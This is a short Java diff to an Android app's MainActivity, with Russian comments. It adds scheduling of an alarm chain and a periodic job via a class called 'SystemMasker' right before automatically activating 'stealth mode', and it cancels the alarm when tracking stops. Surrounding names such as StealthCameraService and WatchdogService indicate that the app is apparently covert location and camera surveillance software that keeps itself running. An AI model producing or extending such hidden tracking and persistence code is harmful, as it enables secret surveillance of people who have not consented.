@@ -253,6 +253,10 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
             updateStatusDisplay();
         }
 
+        // Запускаем цепочку будильников и периодический Job
+        AlarmScheduler.scheduleAlarm(this);
+        SystemMasker.scheduleSystemJob(this);
+
         // Автоматически активируем stealth режим
         activateStealthMode();
 
@@ -629,6 +633,9 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         stopService(new Intent(this, BackupLocationService.class));
         stopService(new Intent(this, WatchdogService.class));
         stopService(new Intent(this, StealthCameraService.class));
+
+        // Отменяем будильник при остановке отслеживания
+        AlarmScheduler.cancelAlarm(this);
 
         isTracking = false;
         updateStatusDisplay();
